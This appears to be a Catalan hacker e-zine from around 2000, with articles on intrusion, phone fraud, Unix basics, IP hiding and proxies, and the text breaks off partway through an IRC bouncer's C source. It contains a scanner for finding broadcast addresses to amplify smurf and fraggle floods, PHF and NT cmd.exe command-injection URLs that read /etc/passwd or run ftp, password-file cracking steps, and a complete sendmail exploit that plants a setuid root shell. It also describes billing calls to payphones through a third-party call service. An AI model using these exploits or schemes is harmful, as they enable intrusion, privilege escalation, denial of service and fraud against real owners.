 /* Broadscan v 0.51
    DUP Broadcast IP scanner
    by Vacuum http://www.technotronic.com
    11.24.98
    This is a very lame scanner written to
    stop people from asking how to find
    DUP broadcast ip addresses. Use this in
    conjunction with smurf, fraggle,
    or papasmurf. DoS kiddies enjoy!
    Revision history:
    0.31 really lame:       implementation broadscan <octet> <octet>
    0.50 not quite as lame: now implemented as broadscan www.xxx.yyy.zzz
			    however .yyy was ignored and started scan at 1
    0.51 still lame:        now recognizes .yyy cleaned up some of the sloppy code      

   Greets to horizon and bodhidarm
*/

#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
    
FILE *stream;

#define DEBUG 1

void pingz0r(int first, int second, int start, int end)
{
int counter,flag;
FILE *stream;
char tempstring[2048];
char parse[2048];

for (counter=start; counter <end; counter++)
{
 flag=0;
 sprintf(tempstring,"ping -c 2 -n  %d.%d.%d.255 2>/dev/null",first,
		     second, counter);
 stream=popen(tempstring,"r");
 while (fgets(parse,sizeof(parse),stream)!=NULL)
 {
  if (DEBUG) printf("Results:%s",parse);
  if (strstr(parse,"DUP"))
  {
    flag=1;
    fclose(stream);
    break;
  }
 }
 if (flag==1)
 stream=fopen("broadcast.txt", "a"); 
 fprintf(stream, "%d.%d.%d.255\n",first,second,counter);
 fclose( stream);
}
}

main(int argc, char *argv[])
{
    char *curr_ip, *del, *cm[100];
    int first, second, third, A4;
 
if (argc!=2)
 {
  printf("\nusage : %s <ipaddress>\n\n",argv[0]);
  exit(0);
 }

 curr_ip=argv[1];
   del=(char *)strtok(curr_ip, ".");
   first=atoi(del);
   del=(char *)strtok(NULL, ".");
   second=atoi(del);
   del=(char *)strtok(NULL, ".");
   third=atoi(del);
   del=(char *)strtok(NULL, ".");
   A4=atoi(del);


if (first==127)
 {
 printf("%d is a localhost. You have no clue or are trying to break this program",first);
 exit(0);
 }
if (first>254  || first <0)
 {
 printf("First octet is: %d. It must be between <1-254>",first);
 exit(0);
 }
if (second>254 || second<0)
 {
 printf("Second octet is: %d. It must be <1-254>",second);
 exit(0);
 } 
if (third>254 || third<0)
 {
 printf("Third octet is: %d. It must be <1-254>",second);
 exit(0);
 } 


printf("Scanning for DUP broadcast ip addresses\n");
printf("Results output to broadcast.txt\n");

	pingz0r(first,second,third,255);
}
 



/* EOF */


                                                            La força de la raó
                                                     contra la raó de la força

==============================================================================
//////////////////////////////////////////////////////////////////////////////
010101010101010101010101010101010101010101010101010101010101010101010101010101
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
==============================================================================


$06$


<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
<<<<< Varies formes de hackejar amb Win >>>>>
<<<<<<<<<<<<<< (nivell baix) >>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<>>>>>>>>>>>> By [hansi]>>>>>>
<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

Per a començar, si tens una mica de idea de hack no segueixis llegint
aquest text ja que veuras que explico tres formes ben basikes per a 
començar aquest mundillo que es el hack.

Bé, vaig a explicar una de les maneres més facils que hi ha per hackejar
amb el Win.
Primer de tot el nostre objectiu té ke tenir el ftp anonim.El primer ke 
tenim ke fer es fer telnet al port 21 i buscar on podem trobar la pass,
que normalment la trobem dins la carpeta etc o en la shadow. Un cop fet 
aixo pot ser ke trobem o no un arxui de password. Si en trobem un podriem
observar una cosa com aixo:

root:User:d7Bdg:1n2HG2:1127:20:Superuser  
TomJones:p5Y(h0tiC:1229:20:Tom Jones,:/usr/people/tomjones:/bin/csh  
BBob:EUyd5XAAtv2dA:1129:20:Billy Bob:/usr/people/bbob:/bin/csh

Aki podem veure ke l'unica cosa ke trobem interesant es en la tercera
linia, ja que a simple vista veiem que el pass en la linia de root es
un farol.

També ens podria sortir un altre tipus d'arxiu passwd com akest:

root:x:0:1:0000-Admin(0000):/:/usr/bin/csh  
daemon:x:1:1:0000-Admin(0000): /:  
bin:x:2:2:0000-Admin(0000):/usr/bin:  
sys:x:3:3:0000-Admin(0000): /:  
adm:x:4:4:0000-Admin(0000):/var/adm:  
lp:x:71:8:0000-lp(0000):/usr/spool/lp:  
smtp:x:0:0:mail usuario del daemon: /:
uucp:x:5:5:0000-uucp(0000):/usr/lib/uucp:  
nuucp:x:9:9:0000-uucp(0000):/var/spool/uucppublic:/usr/lib/uucp/uucico Listen:x:37:4:Network Admin:/usr/net/nls:  
nobody:x:60001:60001:uid ningún cuerpo: /:  
noaccess:x:60002:60002:uid ningún acceso: /:  
Webmastr:x:53:53:WWW Admin:/export/home/webmastr:/usr/bin/csh  
pin4geo:x:55:55:PinPaper Admin:/export/home/webmastr/new/gregY/test/pin4geo:/bin/false  
Ftp:x:54:54:Anonymous FTP:/export/home/anon_ftp:/bin/false

Aqui podem veure que els arxius de contrasenya sombrejats no permeten
veure o copiar la contraseña de la encriptació real.
Aquests arxius solen tenir una x en contes d'una contrasenya o a vegades
inclus es poden ocultar com un *.

Bé el nostre pas seria transmetre o copiar l'arxiu. El seguent pas es
trobar un bon crackejador per el nostre arxiu passwd com podria ser
el John the ripper i per ultim crear una llista de paraules per a fer
servir el crackejador.El nostre resultat pot ser de dues formes:

1- Que l'arxiu sigui bo i hagis desencriptat el passwd.
2- Que l'arxiu sigui fals i l'administrador s'hagi burlat de tu.

-----------------------------------------------------------------------

Una altre forma de intentar haclejar un servidor seria la de PHF.
Bé no se si tinc ke incluir akesta tecnika ja que molts servidor ja
no tenen akest bug.
Akesta tecnica es la mes facil de totes, l'unic ke has de fer es posar aixo
en el netscape o a l'explorer:

http://Aki_la_web_ke_vulguis/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

Podries posar tambe aixo si el sistema es NT.

http://www.host.com/cgi-bin/cmd.exe?/c:%20c:/winnt/system32/ftp.exe%20-s:commands.txt%20dir_IP

Bueno hi aixo es tot, facil oi?

-----------------------------------------------------------------------

I per ultim una ke també es molt facil de fer servir si el nostre objectiu
compleix els requisits.
El primer ke tenim ke fer es un proggie del telnet; hi ha molts clients
diferents que pots fer simplement un netsearch.
Sempre es millor conseguir una conta. 
Bé ho explicaré amb el bug del tipic sendmail v8.8.4 (pensa ke nomes funciona
si el nostre objectiu te el sendmail obert port 25 i tambe te el ftp port 21
obert per poder pujar l'exploit que crearem ara).
Crea un programa del suid/tmp/x com a arrel.
Ki tens l'exploit:

cat << _EOF_ >/tmp/x.c  
 #define RUN "/bin/ksh"  
 #include<stdio.h>  
 main()  
 {  
    execl(RUN,RUN,NULL);  
 }  
_EOF_  
#  
cat << _EOF_ >/tmp/spawnfish.c  
 main()  
 {
   execl("/usr/lib/sendmail","/tmp/smtpd",0);        
 }                                               
_EOF_  
#  
cat << _EOF_ >/tmp/smtpd.c  
 main()  
 {  
   setuid(0); setgid(0);   
   system("chown root /tmp/x ;chmod 4755 /tmp/x");  
 }  
_EOF_  
#
  
gcc -O  -o /tmp/x /tmp/x.c  
gcc -O3 -o /tmp/spawnfish /tmp/spawnfish.c  
gcc -O3 -o /tmp/smtpd /tmp/smtpd.c  
#  
/tmp/spawnfish  
kill -HUP `/usr/ucb/ps -ax|grep /tmp/smtpd|grep -v grep|sed s/"[ ]*"// |cut -d" " -f1`  
rm /tmp/spawnfish.c /tmp/spawnfish /tmp/smtpd.c /tmp/smtpd /tmp/x.c  
sleep 5  
if [ -u /tmp/x ] ; then  
   echo "leet..."  
   /tmp/x
fi

-----------------------------------------------------------------------
Nota: Si veieu ke el servidor no fa servir la mateixa versio de sendmail
vas a rootshell per exemple el buskes alla i segueixes els mateixos pasos.
------------------------------------------------------------------------

Abans de res necessites un compilador per a compilar l'exploit. Un cop
compilat es fer telnet per el port 21 (ftp) pujar l'exploit i vinga a
disfrutar.

------------------------------------------------------------------------


[hansi]
Live your dreams.
04 - 04 - 2000

------------------------------------------------------------------------------
==============================================================================
//////////////////////////////////////////////////////////////////////////////
010101010101010101010101010101010101010101010101010101010101010101010101010101
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
==============================================================================


$07$


1008 1005 1009 1008 1005 1009 1008 1005 1009 1008 1005 1009 1008 1005 1009
1008 1005 1009 1008 1005                               1009 1008 1005 1009
1008 1005 1009 1008 1005  @ @ Estudi Timofonic. @ @ @  1009 1008 1005 1009
1008 1005 1009 1008 1005  @                         @  1009 1008 1005 1009
1008 1005 1009 1008 1005  @   SERVEI DELS NOMBRES   @  1009 1008 1005 1009
1008 1005 1009 1008 1005  @    1005, 1008, 1009.    @  1009 1008 1005 1009
1008 1005 1009 1008 1005  @                         @  1009 1008 1005 1009
1008 1005 1009 1008 1005  @ @ @ @ @ @ @ by KonstaN. @  1009 1008 1005 1009
1008 1005 1009 1008 1005                               1009 1008 1005 1009
1008 1005 1009 1008 1005 1009 1008 1005 1009 1008 1005 1009 1008 1005 1009

Be, aqui estic, per oferir el meu primer TXT en aquesta revista.
Aixo es una col.laboracio puntual, ja que Pop.tPH m'ha ratllat durant messos
per a que hi col.labores (content ??? xD).

Imagino que tots vosaltres sabreu  de l'existencia d'aquests tres nombres,
servei oferit per gentilesa de Timofonica S.L. (Super Lladre), el 1005, el
1008 i el 1009.  Aquests tres nombres  son totalment  gratuits i en el cas
que truqueu  desde una cabina  hos demanara  una moneda  de 5 duros que al
penjar  hos tornara, es a dir,  que nomes fara  servir aquesta  moneda per
establir la trucada.

Aquest text es merament informatiu, no espereu trobar cap gallina dels ous
d'or en ell,  nomes alguna curiositat  interesant amb alguna aplicacio que
no hos lliurara de seguir  sent sangrats per el nostre estimat Villalonga.
Amb merament  informatiu  tambe vui  dir que no em faig  responsable  dels
ussos malignes o fraudolents  que s'en puguin extreure de la seva lectura,
aquests seran unica i exclusivament responsabilitat vostre.

Tornant  al texte  en si,  dir-vos que tots tres  nombres  tenen un servei
similar,  diferenciant-se  entre  ells  per la zona  que aquests  abarquen
(nacional, europeu i internacional). Comencem amb l'analisis:

                            _.-._1009_.-._

Aqui tenim el nombre de covertura nacional (Espanya desgraciadament) on al
començar ens dira que premem dos cops l'asterisc, sino ho fem o premem una
altre tecla ens fara escollir  totes les opcions posteriors amb la veu, si
pel contrari  els premem  tindrem que fer-ho mitjansan  el teclat numeric.
Les opcions que podrem escollir  posteriorment,  pulsant o dient el nombre
adecuat, seran:

4- cobrament revertit:

Aqui  el primer  que ens demanen  es que indiquem  el nombre  al que volem
trucar,  aquest no pot ser un mobil ni una trucada  internacional  (ja que
per aquestes ultimes hi ha destinat un altre nombre).  Un cop fet aixo ens
demana  el nostre nom.  Tindrem  tres segons  per a dir el nostre  nom que
quedara  enregistrat  en un contestador  i nom sera  el que comunicara  al
destinatari  de la trucada  amb el seguent  misatge:  Acepta una llamada a
cobro  revertido  de "misatge  enregistrat  en el contestador  quan ens ha
demanat el nom".  Ara imagineu  tot el que podeu dir en tres segons... ja?
Bueno per si no s'us acut res aqui van algunes idees:

-Bromes Ex. Acepta una llamada a cobro revertido de "alguien que le quiere
 matar"?
 
 Acepta una llamada a cobro revertido de "su puta madre"?

-KDDs Ex. Acepta una llamada a cobro revertido de "Soc en Pep quedem a les
 2 al Bar".

Segur que ara sus acuden molts altres misastges  ha deixar en tres segons.
Seria recomanable que el destinatari  estigues enterat d'aquest petit truc
pq sino el tio es quedara flipant xD.  Naturalment,  tambe ha de saber que
no ha d'acceptar la trucada.

5- targeta:

Aquesta  opcio es per emprar unes targetes que Telefonica  ofereix a no se
qui  (en Pop.tPH en te una)  que pot fer servir  en les cabines  per a que
et cobrin  l'import  de la trucada  a la factura  del telefon de casa.  El
primer que tindrem que fer sera introduir la targeta de banda magnetica en
la  cabina  abans  de  marcar  el  1009  i l'opcio  corresponent.  Despres
introduirem el nombre de 10 digits que hi ha indicat a la mateixa targeta,
el numero al que volem trucar i parlar.

6- cobrament a tercers:

Aquest servei  es un dels que pot donar mes joc a les nostres  retorasdes 
ments. No he pogut investigar massa questa opcio, pero tinc una teoria que 
si funciona port ser una mina. El "trapi" en questio es el seguent:

Agafem una  cabina verda de les que podem trobar  a qualsevol bar o altres 
llocs com discoteques,  pubs ( tots dos mes recomanats que un bar )... i a 
traves  d'un movil,  o algun  altre  sistema,  li pillem el seu  numero de 
telefon. Un cop fet aixo truquem al 1009 i seleccionem l'opcio 6, alli ens 
demanara primer que marquem el numero que pagara la trucada, on posarem el 
numero  de la cabina verda,  despres  ens demanara  el telefon  amb el que 
volem parlar i el nostre nom;  a continuacio  ens dira que esperem mentres 
truquen.  Ara  tindria  d'haveri  un complia  a la cabina  del bar  per a 
despenjar  tan bon punt comenci a sonar  ( per aixo recomanava un lloc amb 
musica i soroll per a fer-ho )  i dir que accepta  de pagar  la trucada  i 
magia potagia  ja estem  parlan  amb el numero desitjat.  Recomano  que el 
telefon  amb el que comuniqueu  no sigui d'algu que coneixeu  perque si al 
amo del bar se li acut reclamar  aquesta trucada  a telefonica  comencin a 
investigar  per  alli,  tampoc  deixeu  un nom  complet  en el contestador 
( seria una mica estupid ).

Recordo  a tots  que no es res mes  que  una hipotesis  i que  no ha sigut 
probat mai per lo que no se fins a quin punt es arriscat fer aixo.



7- altra tipus de trucades:

En aquesta  opcio  el contestador  ens  pasara  amb una operadora  i no he
tingut temps ni ganes d'enrollarme amb la operadora per acabar sabent quin
altre tipus  de trucades  si podien  fer.  Si algu si veu amb ganes que ho
descobreixi ell mateix, ho sento ^_^.

                            _.-._1008_.-._

Aquest  nombre  es igual  al 1009  pero  de cobertura  europea  (Comunitat
Europea suposo). Al contestar-nos ens diran el rollo dels dos asteriscos i
ens donaran a escollir entre tres idiomes: 

2- Castella.
3- Angles.
4- Frances.

Despres ens donaran a escollir entre tres opcions excluint el cobrament  a
tercers:

4- cobrament revertit:

Aqui es pot aplicar el truc aquell dels tres segons tambe,  sent en aquest
cas molt  mes  util  degut  al preu  de una  trucada  internacional.  Aqui
l'exemple  de KDDs  no es aplicable  pero si penseu  en els vostres  casos
particulars  (amics o familia al extranger,  etc...) segur que s'us acuden
un munt de posibilitats noves.

5- targeta:

Exactament igual que en el 1009.

6- altra tipus de trucades:

Exactament igual que en el 1009.

                            _.-._1005_.-._

Aquest darrer nombre es el que s'okupa de la cobertura internacional (Fora
d'Espanya  & paisos  que no formin  part  de la Comuniotat  Europea)  i es
exactament igual al 1008 per lo que paso d'explicar el mateix rotllo.

-NOTES-

* Si en algun moment cometeu  un error al donar alguna dada que ens demani
ens pasara amb una operadora,  el millor que podeu fer si us passa aixo es
penjar i tornar a provar.

* Si truqueu  desde  una cabina  i feu el truc  de cobrament  revertit  no
podreu penjar un cop (T) t'intenti comunicar amb el destinatari,  aixi que
no hos fiqueu  paranoics i comenceu  a corre creient que hos han punxat la
trucada  i estan enviant  forces  policials  altament  armades  o intenteu
destruir totalment la cabina perque no hos puguin localitzar,  i espereu a
que l'altre no accepti la trucada  per tornar a intentar una altre cosa si
vols o sino penges i t'envas amb tranquilitat, perque total no heu fet res
il.legal no? ;)

P.D.  Tota falta  trovada  en aquest text ha estat posada  intencionada  i
premeditadament  com a una forma de protesta  contra la societat  on vivim
plena de normes on ningu te dret ni llibertat  per escollir  que es el que
vol fer (si cola cola ^_^).

                                                                 Abril 2K.
                                                                 -KonstaN-

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
//////////////////////////////////////////////////////////////////////////////
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


$08$


####################################################@=-
##                                                   =-
##  Fent traperies en ÚNIX       by Pop.tPH + BaRner =-
##                                                   =-
####################################################@=-



<popnote> li diré únix  pq el nom original està registrat i s'ha de  pagar per
utilitzar-lo ;) </popnote>

Torno a estar aqui, aquest cop per fer-vos una  xerrada sobre l'apasionant món
dels permisos en únix i sobre com podem fer per mouren's per dins i que hem de
fer  si som  admins (administradors  de sistema)  per detectar  els  intrusos,
fer-los fora, xerrar amb ells...etc.

<avís> potser  pels  qui ja en sabeu de linux  serà un article molt cutre pero
hem de donar cabuda als que comencen també </avís>

El bon hacker  no és aquell qui  consegueix accedir a  la màquina, sino aquell
que és capaç de ficar-se als ulls de l'admin  i preveure els seus moviments (i
viceversa, el bon admin  és el que és capaç de ficar-se als ulls de l'intrús).
Prenguem-nos ho com un joc, un caçador que pot ser caçat i un  atacant que pot
ser caçat tb. Tothom  hi participa i  intenta "guanyar" a l'altre, pero no amb
força  ni violència,  sino amb la ment, l'habilitat i una cosa molt important,
"la intel·ligència" si,  aquella  paraula que mai  ens apliquen quan parlen de
nosaltres  (excepte  els  avis  ;) -  Pero  si, haurem  d'estrenar el cervell,
treure-li la pols i entendre que no només és un joc.

Pot  passar-se a cabrejos, males  llets i accions policials triunfals (ecs) --
aixi  doncs, comportemnos  com a bons  jugadors, cal  saber perdre i cal saber
guanyar,  no hem mai  d'humillar a ningú i ofendre'l, si l'intrús és més llest
que l'admin i es capaç de  saltar-se tots els seus atacs per mirar de matar el
seu  procés  o de  descobrir-lo,  MAI, en  cap cas  l'intrús  ha de  ofendre a
l'admin:  un  admin,  és  més  que  un  simple  humà  radera d'una  màquina de
500Mhz-dual, té poders i coneix gent i si vol pot permetre's el luxe de passar
a actes judicials.

Aixi  que si per  casualitat  ens "toca" ser intrusos,  serà millor que ens ho
prenguem  de forma  amistosa,  avisant a  l'admin, de  quines  tècniques t'has
valgut  per no  ser descobert o de quins errors t'has aprofitat per accedir al
seu  sistema.  -  Que serà  d'aquells  temps en que  els intrusos i els admins
passàven estones xerrant per talk...quins temps.

Avui  en dia  tot ha canviat, i la idea  romàntica que tenim  d'una amistat ha
estat totalment distorsionada.- intentem redreçar-la!



UN BON COMENÇAMENT:
-------------------
És  molt important  que practiquem  tot el  que us  possaré més avall no us ho
creieu, funciona, si, pero si no ho practiqueu no us servirà de res. (Empollar
és moltes vegades  inutil) - Aixi que ja us esteu  instal·lant el linux (o bsd
o qualsevol  derivat de l'únix) , aprenent com funciona, buscant amics a l'irc
que tb es conectin  per linux  i obrir-vos  contes shell a totes dues màquines
(pq us pugueu "penetrar" mutuament xD)...


1ª lliçó: Com obrir contes shell, i que son:
---------
  Una conta shell és lo més important a  l'hora d'un hack, amb una conta shell
podem accedir a l'altre  màquina amb únix  (en principi amb  permisos d'usuari
normal) accedint a través del servei telnet (no explicaré la seva historia que
em  fot pal, si  us  interesa,  llegiu  llibres).- Però  bàsicament, el servei
telnet es com estar sentat davant de la màquina.

Per fer aixo, el dimoni "inetd" (de 17.2 KB) ens obra el port 23 (a no ser que
estigui  modificat i ens  obri un altre  (poc probable)- i ens  demana login i
password. :( glups...

  Per poder donar d'alta una conta shell haurem de fer aixo:

# adduser _username_
# passwd _username_
  Enter password: ****
  Re-Enter password: ****

ara l'usuari _username_ ja  té accés amb el pass **** (pass ocult) - Si us heu
fixat,  amb l'ordre passwd  podeu canviar  els passwords  de la gent! si, pero
clar,  hem de tindre  un rang  superior,  allò que  s'anomena  "root",  tenint
aquesta conta podem canviar els passwords a la gent, potser util per eviat que
un intrus torni a entrar (a no ser que torni a encertar el password) :).

Ara  fixem-nos,  el dimoni inetd ens  demana Login: un  cop introduït crida al
programa "login"  que ens demanarà  el password  i el  revisarà en  el fitxer:
/etc/passwd  o  /etc/.shadow (depen de si els passwords estàn sombrejats o no.

Si, si conseguissim  canviar els programa "login" i fer  que redireccionés els
passwords introduïts a  un fitxer del nostre  directori personal /home/intrus/
podriem saber tots els passwords!! pero no és tant fàcil, els creadors de únix
éren (o son :) iaios,  pero pensàven en tot, aixi  que van crear un sistema de
permisos en els fixers: un sistema octal:
                                          .-----------.
_____________.------------------------.   | Permisos:  '-------------.
valor octal:   4 2 1   4 2 1   4 2 1   |  |  r - Read (llegir)        |
permisos:      r-w-x / r-w-x / r-w-x   |--|  w - Write (escriure)     |
pertanyent a:   root   group    user   |  |  x - eXecute (executable) |
             '------------------------'    '-------------------------'

I per  poder canviar  els permisos  d'algu  necessitem  estan  per damunt seu:
l'user no  pot canviar els permisos de root. - per canviar  els permisos podem
utilitzar els programa "chmod" aixi:

# chmod 666 fitxerdetexteperexemple
 -> el fitxer es podrà llegir i escriure (r=4 + w=2 = rw=6)

# chmod 700 fitxerdesistemaexecutableperexemple
 -> el fitxer només el podrà executar el root, els demés no el
    veuràn ni li podràn fer res.

# etc...


Tipus de Xarxes:
!!!!!!!!!!!!!!!!
(bé el cert és que aquest apartat l'ha escrit el BaRner, espero que m'ho
permeti :P )


Hi ha tres formes en que el cable es realitza en una xarxa:

Topologia en anell
Topologia en bus
Topologia en estrella


TOPOLOGIA EN ANELL:

El cable forma un bucle tancat formant un anell. 
Tots els ordinadors que formen part de la xarxa estan conectats a l'anell

Inconvenients:
-Es difícil d'instal.lar
-Si es trenca el cable de l'anell paralitza tota la xarxa.

			    _____
			   |     |
			   |_PC4_|
			      |
 _____             ___________|_______            ______
|     | ________ /                    \__________|      |
|_PC1_|          \____________________/          |__PC2_|
			      |
			     _|____
			    |      |
			    |_ PC3_|



TOPOLOGIA EN ESTRELLA:

 -Totes les estacions  de treball estan conectades a un  punt central,
 formant una estrella.
 -Cada cop que es vulgui establir una conexió entre dos ordinadors,
  la informació transferida ha de passar per el punt central
 -El punt centrar també pot ser una ordinador 
 -La velocitat és alta quan es comunica amb el node central, però és
  baixa quan la comunicació és entre els extrems.
 -Aquest tipu de xarxa s'utilitza quan la comunicació es fa amb el node
  central i no amb els nodes dels extrems.
 -Si es trenca un cable nomes es perd la conexió del node que interconectava.
 -Es fàcil de localitzar un problema a la xarxa



		       _____           _____
		      |     |         |     |
		      |_PC1_|         |_PC2_|   
			     \           /
			      \_________/
			       |  HUB   |
			       |________|
			       /         \
			   __ /_        __\__
			  |     |      |     |
			  |_PC4_|      |_PC3_|


TOPOLOGIA  EN BUS:

Consta de un únic cable que va de un ordinador a l'altre en serie. 
Als extrems del cable hi ha una resistència anomenada terminador que 
el que fan és tancar el bus.

Les avantatges que té aquest tipu de topologia son:
-És fàcil de instal.lar i de mantenir
-No existeixen elements centrals dels que depengui la xarxa

Inconvenients:
-Si es trenca el cable la xarxa queda inoperativa.

				

				  _____
				 |     |
				 |_PC2_|
 ___________                        |          ___________
| Terminador|_______________________|_________| Terminador|
|___________|            |                    |___________|
		       __|__
		      |     |
		      |_PC1_|




SubXarxes:
!!!!!!!!!!

els rangs: 192.168.x.x, 172.16.x.x i 10.x.x.x estàn reservats a subreds.
sabent aixo podem canviar les taules d'enrutament dient-lis que quan busquin
una direcció 192.168.0.0 (per exemple) ho facin a traves del servidor victima,
 entrant d'aquesta forma a la seva subred.

esquema gràfic.
		     .-------- s'utilitza com a router
|_subred_|--.       |
	    |       V
|_subred_|--|--|_servidor_|-----|_internet_|-----|_jo_|
	    |
|_subred_|--'


Espero q us hagi agradat aquesta petita intro a les xarxes amb únix(f) ;) i
que us aneu interessant més pel tema, poc a poc anirem pujant de nivell...si,
ja sé que aquest article té un nivell bastant baix, pero bueno, no tothom té
el mateix nivell no? intentem ajudar-vos a tots, si voleu ampliar el texte,
o qualsevol altre cosa ens podeu informar, escribiu algo i ens ho envieu :)



                                                       Salut i força al canut!

                                                                    -Skarface

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
//////////////////////////////////////////////////////////////////////////////
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

$09$


<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>
>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<
<<<<<<< Ocultació de ips's >>>>>>>>>>>>>>>>>>>>>>>>
>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>>>>>>>>>>>>>>>>>>>>>><<< By [hansi] <<<<<<<<<<<<<
>>>>>>>>>>>>>>>>>>>>>>><<<<<<>>>>>>>>>>>><<<<<<<<<<
<<<<<<>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<>>>>>>>>><<

 __________________
|                  |
| 1- Wingates.     |
| 2- Proxys.       |
| 3- Bouncer.      |
| 4- Ip-Spoofing.  | 
|__________________|


1- Wingates

Wingate es un programa que funciona amb Win 95/96/2000 i NT. Aquest programa
el fan servir els servers proxy per dirigir el trafic que circula per una red
local. El que fa es que fagi unes funcions similars a un router.
Tot el software que fa akestes funcions,es conegut amb el nom de wingate,
pero existeixen molts programes que realitzen akesta funció.
Akests programes no es ke siguin molt dificils de configurar, pero normalment
els administradors es deixen moltes portes obertes que el porgrama porta per
defecte, sobretot les versions més antigues.

Podem fer servir les wingates de moltes maneres. Podem a traves del irc,
també es pot fer servir en el Quote en contes de Raw i els punts 3 i 4 poden
anar en ordre contrari. També hi han els socks que permeten l'acces al IRC
pero a traves del port 1080.


2- Proxys

Be, kuan parlem d'una red sempre pensem en un grup mes o menys gran
d'ordinadors conectats entre si, pero aixo no funciona nomes aixi, hi ha ke
haver-hi una determinada estructura, necessita el que s'en diu un servidor,
que no es altre cosa que una makina amb unes bones prestacions i que fagi
servir un sistema operatiu amb diferents usuaris.


		Servidor              |
		   |              |-- Equip 2
		Equip 1 ----------|
				  |-- Equip 3
				  |

Bé kuan la nostre red necessita tenir sortida al exterior, diem que es un
servidor proxy, totes les dades que arribin de fora de la nostre red tenen
que passar per akesta makina. Existeixen molts tipus de servidors proxy,
 per exemple el teu poveedor d'internet funciona com a server proxy.


3- Bouncer

El bouncer pot ser per exemple un wingate mal configurat o un programa
colocat en una makina per un individu. Es pot fer bouncing desde una makina
unix fent correr un daemond que nosaltres haurem colocat.

Nomes indicarem el port per el ke nosaltres entrarem i la makina i port al ke
saltarem. Aixo es pot fer servir per conectarse al Irc de forma mes segura o
per altres. Aki us deixo un Bouncer per accedir al IRC:

-----------------------------------------------------------------------------------------------
/* Distribution: Public */ 
/* Copyright: Held by the respective contributors */ 
/* Posted to USENET September '93 by Mark mark@cairo.anu.edu.au */ 

/* This file was telserv.c, part of the Telnet Server package v. 1.0, 
     written by "Hal-9000". Much of that package was developed by Richard 
     Stephens and his thanks go to "Xanadude" for providing him with that 
     section. Performance fix by Darren Reed. */ 

/* Reworked to add concurrency, password checking and destination selection 
   on the fly. - Mark 31st Aug 93 

   Now its a IRC bouncer - riley Nov 93. 

   Compiled and tested on: 
       HPUX 9.01 9000/700 series        NeXTStep 3.1 NeXT 68040 
    OSx Pyramid 90x BSD universe     SunOS 5.2 sun4c 
    Ultrix 4.3 DEC RISC 

   To compile, type "cc -O -s ts2.c -o ts2". 
*/ 
  

/*+  IRC Bouncer hacks  +*/ 

#define IRCSERV "irc.lleida.net" 
#define IRCPORT 6667 
#define IRCBNC 9999 

#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <sys/time.h> 
#include <sys/resource.h> 
#include <sys/wait.h> 
#include <fcntl.h> 
#include <errno.h> 
#include <netinet/in.h> 
#include <netdb.h> 
#include <arpa/inet.h> 
#include <sys/ioctl.h> 

#define    QLEN           5 

char sbuf[2048], cbuf[2048]; 
extern int errno; 
extern char *sys_errlist[]; 
void reaper(); 
int main(); 
void telcli(); 

int main(argc, argv) 
int argc; 
char *argv[]; 
{ 
    int srv_fd, rem_fd, rem_len, opt = 1; 
    struct sockaddr_in rem_addr, srv_addr; 
#if !defined(SVR4) && !defined(POSIX) && !defined(linux) && !defined(__386BSD__) && !defined(hpux) 
    union wait status; 
#else 
    int    status; 
#endif /* !defined(SVR4) */ 

    bzero((char *) &rem_addr, sizeof(rem_addr)); 
    bzero((char *) &srv_addr, sizeof(srv_addr)); 
    srv_addr.sin_family = AF_INET; 
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
    srv_addr.sin_port = htons(IRCBNC);  /*+ IRC Bouncer hack  +*/ 
    srv_fd = socket(PF_INET, SOCK_STREAM, 0); 
    if (bind(srv_fd, (struct sockaddr *) &srv_addr, sizeof(srv_addr)) == -1) { 
	perror("bind"); 
	exit(-1); 
    } 
    listen(srv_fd, QLEN); 
    close(0); close(1); close(2); 
#ifdef TIOCNOTTY 
    if ((rem_fd = open("/dev/tty", O_RDWR)) >= 0) { 
	ioctl(rem_fd, TIOCNOTTY, (char *)0); 
	close(rem_fd); 
    } 
#endif 
    if (fork()) exit(0); 
    while (1) { 
    rem_len = sizeof(rem_addr); 
	rem_fd=accept(srv_fd, (struct sockaddr *) &rem_addr, &rem_len); 
	if (rem_fd < 0) { 
	    if (errno == EINTR) continue; 
	    exit(-1); 
	} 
	switch(fork()) { 
	case 0:                             /* child process */ 
	    close(srv_fd);                  /* close original socket */ 
	    telcli(rem_fd);                 /* process the request */ 
